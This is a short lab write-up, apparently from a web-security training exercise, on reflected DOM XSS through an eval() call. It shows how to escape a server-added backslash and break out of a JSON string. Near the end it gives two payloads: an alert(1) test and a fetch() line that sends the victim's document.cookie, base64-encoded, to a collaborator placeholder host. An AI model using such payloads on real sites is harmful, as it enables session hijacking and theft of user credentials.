# Reflected DOM XSS eval function (escaping backslash with backslash in json)

<br>

We found that a call is made to the eval() function where the variable’s value depends on our input.

![Screenshot1](/04-Screenshots/eval1.png)

![Screenshot2](/04-Screenshots/eval2.png)

We tried to break the string by inserting double quotes, but they are escaped, i.e.:

```bash
foo"foo -> foo\"foo 
```

<br>

By supplying a backslash + double quote ourselves we can escape the server’s backslash and thus inject our double quotes:

```bash
foo"foo -> foo\"foo -> foo\\"foo -> foo"foo
```

![Screenshot3](/04-Screenshots/eval3.png)

![Screenshot4](/04-Screenshots/eval4.png)

Workflow:

```bash
-  -> concatenates with alert(1); it’s cleaner to use
\  -> escapes the double quote 
}  -> closes the JSON
// -> comments out the rest, which in this case are the leftover " 
```

```js
\"-alert(1))}//
\"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
```

> Note: it’s important to remember that we can comment out the remainder with // because the data sent is a string and has not been parsed as JSON. 
> In fact, JSON does not allow using a function as a value as we did above.